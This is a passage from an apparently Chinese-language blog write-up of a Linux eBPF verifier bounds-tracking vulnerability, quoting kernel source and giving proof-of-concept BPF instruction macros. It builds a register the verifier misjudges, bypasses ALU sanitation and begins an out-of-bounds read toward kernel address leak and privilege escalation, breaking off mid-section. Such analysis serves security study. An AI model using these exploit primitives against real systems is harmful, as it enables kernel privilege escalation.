0, </span><br><span class="hljs-comment"> *  故我们返回常数 min (因为 min == max).</span><br><span class="hljs-comment"> */</span><br>delta = (<span class="hljs-number">1ULL</span> &lt;&lt; bits) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> TNUM(min &amp; ~delta, delta);<br>&#125;<br><br><span class="hljs-comment">/* 需要注意的是若 a 与 b 不同意 - 即其一有一个 &#x27;known 1&#x27; 而另一个则</span><br><span class="hljs-comment"> * 有一个 &#x27;known 0&#x27; - 这将为该位返回一个 &#x27;known 1&#x27;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_intersect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tnum a, <span class="hljs-keyword">struct</span> tnum b)</span><br>&#123;<br>u64 v, mu;<br><br>v = a.value | b.value;<br>mu = a.mask &amp; b.mask;<br><span class="hljs-keyword">return</span> TNUM(v &amp; ~mu, mu);<br>&#125;<br><br><span class="hljs-comment">/* 尝试基于无符号最小/最大值改进 var_off 信息 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_bound_offset(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var64_off</span> =</span> tnum_intersect(reg-&gt;var_off,<br>       tnum_range(reg-&gt;umin_value,<br>  reg-&gt;umax_value));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_intersect(tnum_subreg(reg-&gt;var_off),<br>tnum_range(reg-&gt;u32_min_value,<br>   reg-&gt;u32_max_value));<br><br>reg-&gt;var_off = tnum_or(tnum_clear_subreg(var64_off), var32_off);<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个操作在这里都不会影响 R2 的值</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>现在我们来构造能够触发该漏洞的两个寄存器 <code>R2 = &#123; .value = 1, mask = 0xffffffff00000000 &#125;</code> 与 <code>R3 = &#123; .value = 0x100000002, mask = 0 &#125;</code>，其中 <code>R3</code> 可以直接通过赋值构造一个 known 的寄存器， <code>R2</code> 需要一半已知一半未知，可以通过 <em>从 map 中取出一个值进行赋值</em> 的方式先构造出一个 unknown 的寄存器，再与 <code>0xffffffff00000000</code> 做 AND 操作使其低 32 位变为 known：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> POC_PROG(__map_fd)                              \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* Load value from map */</span>                       \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),            \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),   \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_4),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x1),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><p>把这个程序载入内核过一遍 verifier，简单打印下日志，可以看到<strong>我们确乎构造出了一个最小边界值为 1、最大边界值为 0 的寄存器</strong>：</p><p><img src="https://s2.loli.net/2023/06/02/br1XJgjKeFR6pOq.png" alt="测试 poc"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02. 漏洞利用"></a>0x02. 漏洞利用</h1><p>接下来我们考虑如何利用这个漏洞完成提权，现在我们有了一个 32 位边界值为 <code>[1，0]</code> 、32位推测值与32位运行时值都为 0 的寄存器，接下来我们考虑如何构造一个<strong>verifier 推测值与运行时值不同的寄存器</strong>，从而继续完成后续利用</p><h2 id="一、构造边界值为-1-0-的寄存器"><a href="#一、构造边界值为-1-0-的寄存器" class="headerlink" title="一、构造边界值为 [1, 0] 的寄存器"></a>一、构造边界值为 [1, 0] 的寄存器</h2><p><strong>第一步还是先利用漏洞构造一个最小边界值为 1、最大边界值为 0 的寄存器</strong>，因为 R1~R5 有的时候要用来作为函数参数，所以这里我们改为在 <code>R6</code> 上继续构造</p><p>因为读取 map 的操作代码行数太长了（），所以笔者现在给他封装到一个 <code>BPF_READ_ARRAY_MAP_IDX()</code> 宏里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* get a pointer to bpf_array */</span>                \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* mov the result back and clear R0 */</span>          \</span><br><span class="hljs-meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><h2 id="二、构造运行时为-1、verifier-确信为-0-的寄存器"><a href="#二、构造运行时为-1、verifier-确信为-0-的寄存器" class="headerlink" title="二、构造运行时为 1、verifier 确信为 0 的寄存器"></a>二、构造运行时为 1、verifier 确信为 0 的寄存器</h2><p>我们还是考虑继续在 32 位上做文章，假如我们构造出另一个 32 位边界值为 <code>[0, 1]</code> 、32位运行时值为 <code>0</code> 寄存器 <code>R7</code>，将这个寄存器与我们的 <code>R6</code> 相加，其边界值计算其实就是检查是否有溢出然后简单的把两个寄存器边界相加：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>s32 smax_val = src_reg-&gt;s32_max_value;<br>u32 umin_val = src_reg-&gt;u32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||<br>    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;<br>dst_reg-&gt;s32_min_value = S32_MIN;<br>dst_reg-&gt;s32_max_value = S32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;s32_min_value += smin_val;<br>dst_reg-&gt;s32_max_value += smax_val;<br>&#125;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||<br>    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;<br>dst_reg-&gt;u32_min_value = <span class="hljs-number">0</span>;<br>dst_reg-&gt;u32_max_value = U32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;u32_min_value += umin_val;<br>dst_reg-&gt;u32_max_value += umax_val;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时我们的寄存器 <code>R6</code> 32位边界值为 <code>[1, 1]</code>，之后 verifier 会调用 <code>__reg_bound_offset()</code> 反向赋值给 <code>var_off</code>，此时我们的 <code>var_off</code> 的 32 位值便为 <code>1</code>，但实际上的 32 位值为 0，我们便获得了一个<strong>运行时为 0 、verifier 认为是 1 的寄存器</strong></p><p><img src="https://s2.loli.net/2023/06/03/C3PqmrvoNpFXJVc.png" alt="R6 += R7"></p><p>这样一个寄存器好像对我们来说没有太多作用，但如果我们再给 <code>R6</code> 加上 <code>1</code> ，从而使得 32 位 <code>var_off</code> 变为 <code>2</code>，<strong>但实际上的 32 位值为 1</strong>，我们再将 <code>R6</code> 与 <code>1</code> 做 <code>&amp;</code> 运算，<strong>verifier 便会认为该寄存器的值变为 0，但其实际上的运行时值为 1</strong></p><p><img src="https://s2.loli.net/2023/06/03/shRKgi38zScMfOe.png" alt="R6 += 1"></p><p><img src="https://s2.loli.net/2023/06/03/UBW2qvyrlsVax4I.png" alt="verifier:0, runtime:1"></p><p>有了这样一个寄存器，后面我们就可以开始为所欲为了：）</p><p>对于 <code>R7</code> 的构造，我们可以先从 map 中取值获取一个 verifier 全不可知的寄存器，之后利用 32 位判断跳转指令 <code>BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2)</code> 使其变为 <code>&#123; .var_off = 0, .mask = 0xffffffff00000001&#125;</code> 即可，map 中的值是我们可控的所以我们可以使其运行时值为 0 ：</p><blockquote><p>注：你也可以先给 R6 +&#x3D; 1 再 R6 &amp;&#x3D; R7，效果是一样的</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br></code></pre></td></tr></table></figure><blockquote><p>可能大家会想到对于条件跳转指令而言 verifier 主要根据边界值进行判断，或许我们能够构造一个运行时为真但 verifier 认为假的条件跳转语句（例如 <code>BPF_JMP32_IMM(BPF_JGE, BPF_REG_6, 1, 1)</code>）并在 verifier 认为恒为假但运行时为真的分支中隐藏恶意指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">is_branch32_taken</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u32 val, u8 opcode)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">subreg</span> =</span> tnum_subreg(reg-&gt;var_off);<br>s32 sval = (s32)val;<br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_JGE:<br><span class="hljs-keyword">if</span> (reg-&gt;u32_min_value &gt;= val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (reg-&gt;u32_max_value &lt; val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>但这并不是一个可行的方案，因为对于不可达指令（dead code），<strong>verifier会将其 patch 为跳转回条件分支指令</strong>，从而导致我们无法在此处藏入恶意代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sanitize_dead_code</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn_aux_data</span> *<span class="hljs-title">aux_data</span> =</span> env-&gt;insn_aux_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">trap</span> =</span> BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span> =</span> env-&gt;prog-&gt;insnsi;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> insn_cnt = env-&gt;prog-&gt;len;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++) &#123;<br><span class="hljs-keyword">if</span> (aux_data[i].seen)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-built_in">memcpy</span>(insn + i, &amp;trap, <span class="hljs-keyword">sizeof</span>(trap));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="三、内核地址泄露"><a href="#三、内核地址泄露" class="headerlink" title="三、内核地址泄露"></a>三、内核地址泄露</h2><p>接下来我们考虑如何泄露内核地址，比较容易想到的是我们或许可以通过这个运行时为 1 而 verifier 认为是 0 的寄存器构造一些越界读取，而 map 是我们能够直接接触到的指针之一，因此我们可以尝试从此处下手</p><p>我们是否可以直接向  <code>BPF_FUNC_map_lookup_elem()</code>  传入一个 verifier 确信为 0 但实际上是负数的寄存器呢？<strong>答案是否定的</strong>，因为对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型的 map 而言在查找元素时实际上会调用到 <code>array_map_lookup_elem()</code> ，其 index 为无符号类型，因此我们无法前向读取：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall or from eBPF program */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">array_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = *(u32 *)key;<br><br><span class="hljs-keyword">if</span> (unlikely(index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">array</span>-&gt;value + <span class="hljs-built_in">array</span>-&gt;elem_size * (index &amp; <span class="hljs-built_in">array</span>-&gt;index_mask);<br>&#125;<br></code></pre></td></tr></table></figure><p>但当我们在 eBPF 程序中调用 <code>BPF_FUNC_map_lookup_elem()</code>  时，其返回值为指向 <code>value</code> 的指针，而<strong>这个指针是允许与常量做运算的</strong>（类型为 <code>PTR_TO_MAP_VALUE</code> ），由于我们有一个 verifier 认为是 0 的寄存器，我们可以轻松绕过对指针范围的检查并完成越界读取……吗？</p><h3 id="ALU-Sanitation-bypass"><a href="#ALU-Sanitation-bypass" class="headerlink" title="ALU Sanitation bypass"></a>ALU Sanitation bypass</h3><p><code>ALU Sanitation</code> 是一个用于<strong>运行时动态检测</strong>的功能，通过对程序正在处理的实际值进行运行时检查以弥补 verifier 静态分析的不足，这项技术通过调用 <code>fixup_bpf_calls()</code> <strong>为 eBPF 程序中的每一条指令的前面都添加上额外的辅助指令</strong>来实现</p><p>对于 <code>BPF_ADD</code> 及 <code>BPF_SUB</code> 这样的指令而言，会添加如下辅助指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fixup_bpf_calls</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (insn-&gt;code == (BPF_ALU64 | BPF_ADD | BPF_X) ||<br>    insn-&gt;code == (BPF_ALU64 | BPF_SUB | BPF_X)) &#123;<br><span class="hljs-type">const</span> u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;<br><span class="hljs-type">const</span> u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">insn_buf</span>[16];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">patch</span> =</span> &amp;insn_buf[<span class="hljs-number">0</span>];<br><span class="hljs-type">bool</span> issrc, isneg;<br>u32 off_reg;<br><br>aux = &amp;env-&gt;insn_aux_data[i + delta];<br><span class="hljs-keyword">if</span> (!aux-&gt;alu_state ||<br>    aux-&gt;alu_state == BPF_ALU_NON_POINTER)<br><span class="hljs-keyword">continue</span>;<br><br>isneg = aux-&gt;alu_state &amp; BPF_ALU_NEG_VALUE;<br>issrc = (aux-&gt;alu_state &amp; BPF_ALU_SANITIZE) ==<br>BPF_ALU_SANITIZE_SRC;<br><br>off_reg = issrc ? insn-&gt;src_reg : insn-&gt;dst_reg;<br><span class="hljs-keyword">if</span> (isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - <span class="hljs-number">1</span>);<br>*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="hljs-number">0</span>);<br>*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="hljs-number">63</span>);<br><span class="hljs-keyword">if</span> (issrc) &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,<br> off_reg);<br>insn-&gt;src_reg = BPF_REG_AX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,<br> BPF_REG_AX);<br>&#125;<br><span class="hljs-keyword">if</span> (isneg)<br>insn-&gt;code = insn-&gt;code == code_add ?<br>     code_sub : code_add;<br>*patch++ = *insn;<br><span class="hljs-keyword">if</span> (issrc &amp;&amp; isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>cnt = patch - insn_buf;<br><br>new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);<br><span class="hljs-keyword">if</span> (!new_prog)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>delta    += cnt - <span class="hljs-number">1</span>;<br>env-&gt;prog = prog = new_prog;<br>insn      = new_prog-&gt;insnsi + i + delta;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>aux-&gt;alu_limit</code> 为<strong>当前指针运算范围</strong>，初始时为 0，与指针所做的常量运算同步，对于减法而言可读范围为 <code>(ptr - alu_limit, ptr]</code> （以指针最初指向的地址为 <code>0</code>），因此我们还需要绕过这个检查</p><p>由于我们有运行时为 1、verifier 认为是 0 的寄存器，我们可以这样调整范围：</p><ul><li>构造另外一个同样是运行时值为 1、verifier 认为是 0 的寄存器 <code>R8</code></li><li>将 <code>R8</code> 乘上一个不大于 value size 的值（例如 value size 为 <code>0x1000</code>，<code>R8</code> 便设为 <code>0x1000</code>）</li><li>将指向 map 第一个元素第一个字节 <code>value[0]</code> 的寄存器（假设为 <code>R7</code> ）先加上 <code>0x1000</code>，此时 <code>alu_limit</code> 变为 <code>0x1000</code>，<code>R7</code> 指向 <code>value[0x1000]</code></li><li><code>R7 -= R8</code>，由于 verifier 认为 R8 为 0，因此 <code>alu_limit</code> 保持不变，<strong>但 R7 实际上已经指回了</strong> <code>value[0]</code></li></ul><p>由此我们便能继续愉快地进行前向的越界读了</p><blockquote><p>注：在内核版本 5.11.8 之前 ALU Sanitation 存在一个漏洞，即 <code>aux_alu_limit</code> 被初始化为 0 从而导致 <code>0-1</code> 造成整型溢出变为一个巨大的值，在<a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899">这个 commit</a> 中才被修复，因此对于 5.11.8 之前版本的内核而言是不需要绕过该检查的</p></blockquote><h3 id="OOB-read-on-bpf-array"><a href="#OOB-read-on-bpf-array" class="headerlink" title="OOB-read on bpf_array"></a>OOB-read on bpf_array</h3><p>现在让我们来看看这个存放数据的位置附近有没有什么有趣的数据，对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型 的 map 而言，其 wrapper 为 <code>bpf_array</code> 类型（即 <code>bpf_map</code> 内嵌于该结构体中），<strong>数据则直接存放在其内部的</strong> <code>value</code> <strong>数组成员当中</strong>，因此在查找元素时我们获得的其实是一个指向 <code>bpf_array</code> 内部的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span 